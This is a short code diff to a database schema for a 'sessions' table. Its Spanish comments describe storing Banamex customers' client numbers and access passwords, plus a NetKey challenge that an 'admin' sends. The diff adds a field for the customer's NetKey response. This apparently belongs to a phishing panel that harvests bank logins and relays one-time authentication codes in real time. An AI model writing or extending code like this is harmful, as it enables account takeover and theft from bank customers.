@@ -123,7 +123,8 @@ export const sessions = pgTable("sessions", {
   dispositivo: text("dispositivo"), // Android, iPhone, PC, etc.
   numeroCliente: text("numero_cliente"), // Número de cliente de Banamex
   claveAcceso: text("clave_acceso"), // Clave de acceso de Banamex
-  challenge: text("challenge"), // Challenge NetKey de 8 dígitos
+  challenge: text("challenge"), // Challenge NetKey de 8 dígitos (código que admin envía)
+  netkeyResponse: text("netkey_response"), // Respuesta NetKey del cliente
   pasoActual: text("paso_actual").default("folio"),
   createdAt: timestamp("created_at").defaultNow(),
   active: boolean("active").default(true),
